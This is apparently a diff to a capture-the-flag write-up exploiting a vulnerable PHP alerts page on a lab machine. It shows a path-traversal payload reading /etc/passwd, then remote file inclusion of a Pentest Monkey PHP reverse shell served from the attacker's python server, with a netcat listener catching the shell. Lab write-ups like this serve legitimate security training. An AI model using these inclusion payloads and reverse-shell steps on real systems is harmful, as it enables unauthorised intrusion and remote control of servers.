@@ -140,4 +140,19 @@ So, let's try to get the /etc/passwd file first. Our crafted payload should look
 ```bash
 http://10.10.19.189/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 ```
-And we have the /etc/passwd file, which we will save. 
+And we have the /etc/passwd file, which we will save.
+Now, let's craft a payload based off the the first example to get a reverse shell. We'll head to revshells.com, input your IP and port(I'm using the default 9001. Now scroll down on the left and I'm going to use the PHP Pentest Monkey shell. Save it as a file on your machine. Set up a netcat listener on the listening port in our shell.
+```bash
+nc -lvnp 9001
+```
+And set up a python server:
+```bash
+python3 -m http.server
+```
+Our crafted payload should look like this, except the target IP and whatever your named your shell file:
+```bash
+http://10.10.33.12/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.184.75:8000/monkey.php
+```
+And we down have a reverse shell as www-data! Upgrade your shell as shown in the screen shot:
+
+![shell](https://github.com/user-attachments/assets/c75151c8-6f82-47a1-bf9b-9635d0615000)
